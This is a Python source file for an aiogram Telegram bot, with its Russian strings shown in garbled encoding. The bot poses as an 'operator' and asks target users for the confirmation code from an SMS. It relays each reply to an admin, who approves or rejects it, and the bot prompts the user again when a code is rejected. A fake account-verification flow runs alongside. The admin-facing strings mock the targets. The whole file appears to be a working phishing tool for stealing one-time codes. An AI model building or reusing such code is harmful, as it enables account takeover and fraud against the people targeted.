from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from config import ADMIN_ID
from aiogram.filters.command import CommandObject

router = Router()

pending_codes = {}
pending_verifes = {}


# üëá –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–Ω–æ–ø–∫–∞–º–∏ –¥–ª—è –∞–¥–º–∏–Ω–∞
admin_code_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="‚úÖ", callback_data="code_ok"),
            InlineKeyboardButton(text="‚ùå", callback_data="code_wrong")
        ]
    ]
)

admin_verif_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="‚úÖ", callback_data="verif_ok"),
            InlineKeyboardButton(text="‚ùå", callback_data="verif_wrong")
        ]
    ]
)


def get_user_verif_keyboard(user_id: int):
    return InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='‚úÖ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ–π–¥–µ–Ω–∞', callback_data=f'verif:{user_id}')
                ]
            ]
    )


@router.message(Command("get_verif"))
async def get_verif(message: types.Message, command: CommandObject):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(command.args)
            pending_verifes[user_id] = ADMIN_ID

            await message.answer(f'<b>–ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –≤–µ—Ä–∏—Ñ\n—Ç—É–∫... —Ç—É–∫... {user_id}</b>',
                                 parse_mode='HTML')

            await message.bot.send_message(user_id,
                                           '–û–ø–µ—Ä–∞—Ç–æ—Ä –∑–∞–ø—Ä–æ—Å–∏–ª —É –í–∞—Å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ.',
                                           reply_markup=get_user_verif_keyboard(user_id))
        except Exception as e:
            await message.answer(f'‚ùå –û—à–∏–±–∫–∞: <b>{e}</b>', parse_mode='HTML')


@router.message(Command("get_code"))
async def start_command(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            pending_codes[user_id] = ADMIN_ID
            await message.answer(f"<b>—â–∞ —Å—Ö–æ–∂—É —Å–ø—Ä–æ—à—É"
                                 f"\n—É –≤–æ—Ç–µ—Ç–∞–≤–∞ {user_id}</b>",
                                 parse_mode="HTML")
            await message.bot.send_message(user_id, '–û–ø–µ—Ä–∞—Ç–æ—Ä –∑–∞–ø—Ä–æ—Å–∏–ª —É –í–∞—Å –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏–∑ –°–ú–°.'
                                                    '\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.')
        except (IndexError, ValueError):
            await message.answer("‚ùó —á—É–¥–∞–∫? –Ω–∞–ø–∏—à–∏ –Ω–æ—Ä–º–∞–ª—å–Ω–æ. –ü—Ä–∏–º–µ—Ä:\n<b>/get_code 123456789</b>",
                                 parse_mode='HTML')
        except Exception as e:
            await message.answer(f'–¢—ã —á–µ—Ç–æ –Ω–µ —Ç–∞–∫ —Å–¥–µ–ª–∞–ª, —á–∏—Ç–∞–π –æ—à–∏–±–∫—É –∏–ª–∏ –∫–∏–Ω—å —É–º–Ω–æ–º—É –∫–∞–∫–æ–º—É-—Ç–æ\n<b>{e}</b>',
                                 parse_mode='HTML')


@router.message(F.text)
async def receive_code(message: types.Message):
    if message.from_user.id in pending_codes:
        admin_id = pending_codes[message.from_user.id]
        await message.bot.send_message(
            admin_id,
            f"üì© —Å—é—é—é–¥–∞ –∫–æ—Ç–ª–µ—Ç–∫–∞, –∂–º—è–∫–∞–π —à–æ —Ç–∞–º ({message.from_user.id}):\n\n`{message.text}`",
            parse_mode="Markdown",
            reply_markup=admin_code_keyboard
        )
        await message.answer("‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.")


@router.callback_query(F.data == "code_ok")
async def code_ok_handler(callback: CallbackQuery):
    await callback.answer("–∏–∑–∏")
    await callback.message.edit_reply_markup(reply_markup=None)

    text = callback.message.text
    user_id = int(callback.message.text.split("—à–æ —Ç–∞–º (")[1].split(")")[0])

    pending_codes.pop(user_id, None)


@router.callback_query(F.data == "code_wrong")
async def code_wrong_handler(callback: CallbackQuery):
    await callback.answer("—â–∞ –ø–æ–π–¥—É —Å–ø—Ä–æ—à—É —á–µ —Ç–∞–º")

    text = callback.message.text
    user_id = int(callback.message.text.split("—à–æ —Ç–∞–º (")[1].split(")")[0])

    await callback.bot.send_message(
        user_id,
        "‚ùå –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –∫–æ–¥ –æ–∫–∞–∑–∞–ª—Å—è –Ω–µ–≤–µ—Ä–Ω—ã–º. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑ –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –∫–æ–¥."
    )

    await callback.message.edit_reply_markup(reply_markup=None)


@router.callback_query(F.data.startswith("verif:"))
async def user_verif_send(callback: CallbackQuery):
    user_id = int(callback.data.split(':')[1])
    await callback.answer('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.')
    await callback.bot.send_message(
        ADMIN_ID,
        f"<b>–Ω—É —á–µ–ª —Å–∫–∞–∑–∞–ª, —à–æ –≤—Å—ë —Å–¥–µ–ª–∞–ª\n{user_id}</b>",
        reply_markup=admin_verif_keyboard,
        parse_mode='HTML'
    )


@router.callback_query(F.data == 'verif_ok')
async def verif_ok(callback: CallbackQuery):
    await callback.answer("üéñ –ì–µ—Ä–æ–π —Å–æ–≤–µ—Ç—Å–∫–æ–≥–æ —Å–æ—é–∑–∞")
    await callback.message.edit_reply_markup(reply_markup=None)

    user_id = int(callback.message.text.split("\n")[1])

    await callback.bot.send_message(user_id,
                                    '<b>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–π–¥–µ–Ω–∞ ‚úÖ</b>',
                                    parse_mode='HTML')
    pending_codes.pop(user_id, None)


@router.callback_query(F.data == 'verif_wrong')
async def verif_wrong(callback: CallbackQuery):
    user_id = int(callback.message.text.split("\n")[1])
    await callback.answer("–ø–µ—Ä–µ—Å–ø—Ä–æ—à—É —Å–µ–π—á–∞—Å")
    await callback.message.edit_reply_markup(reply_markup=None)

    await callback.bot.send_message(
        user_id,
        "‚ùå –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–µ –ø—Ä–æ–π–¥–µ–Ω–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑ –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º –¥–ª—è –ø–æ–º–æ—â–∏."
    )

    pending_verifes.pop(user_id, None)


@router.callback_query()
async def unknown_callback(callback: CallbackQuery):
    await callback.answer("‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ", show_alert=True)